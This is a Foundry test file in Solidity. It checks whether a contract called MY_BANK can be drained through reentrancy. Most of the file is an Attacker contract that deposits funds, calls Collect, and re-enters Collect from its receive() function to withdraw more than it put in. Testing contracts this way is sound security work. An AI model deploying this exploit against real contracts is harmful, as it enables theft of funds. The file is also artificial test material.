
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {MY_BANK, Log} from "../src/MY_BANK.sol";

contract TestReentrancyMY_BANK is Test {
    MY_BANK public _contractUnderTest;
    Log public _log;
    Attacker public _attacker;

    function setUp() public {
        _log = new Log();
        _contractUnderTest = new MY_BANK(address(_log));
        _attacker = new Attacker(address(_contractUnderTest));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        vm.assume(attackVal >= 1 ether);
        vm.assume(attackVal <= type(uint128).max);

        vm.deal(address(_contractUnderTest), attackVal * 2);
        vm.deal(address(_attacker), attackVal * 2);
        vm.deal(address(this), attackVal * 2);

        _attacker.setupAttack{value: attackVal}(attackVal);

        vm.warp(block.timestamp + 100);

        _attacker.attack(attackVal);

        assertTrue(
            _attacker.exploitSucceeded(),
            "Reentrancy attack failed: exploitSucceeded flag was not set."
        );
    }

    receive() external payable {}
}

contract Attacker {
    MY_BANK public victim;

    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public initialSnapshot;
    uint256 public storedAttackVal;

    constructor(address victimAddress) {
        victim = MY_BANK(victimAddress);
    }

    function setupAttack(uint256 val) public payable {
        attackCallCount = 1;
        exploitSucceeded = false;
        storedAttackVal = val;

        victim.Put{value: val}(0);
    }

    function attack(uint256 val) public {
        initialSnapshot = address(this).balance;

        uint256 withdrawAmount = val;
        if (withdrawAmount > address(victim).balance) {
            withdrawAmount = address(victim).balance;
        }
        if (withdrawAmount > victim.Acc(address(this)).balance) {
            withdrawAmount = victim.Acc(address(this)).balance;
        }

        victim.Collect(withdrawAmount);

        if (address(this).balance > initialSnapshot) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        if (attackCallCount < 2) {
            attackCallCount++;

            uint256 withdrawAmount = storedAttackVal;
            if (withdrawAmount > address(victim).balance) {
                withdrawAmount = address(victim).balance;
            }
            if (withdrawAmount > victim.Acc(address(this)).balance) {
                withdrawAmount = victim.Acc(address(this)).balance;
            }

            if (withdrawAmount > 0) {
                victim.Collect(withdrawAmount);
            }
        }
    }
}
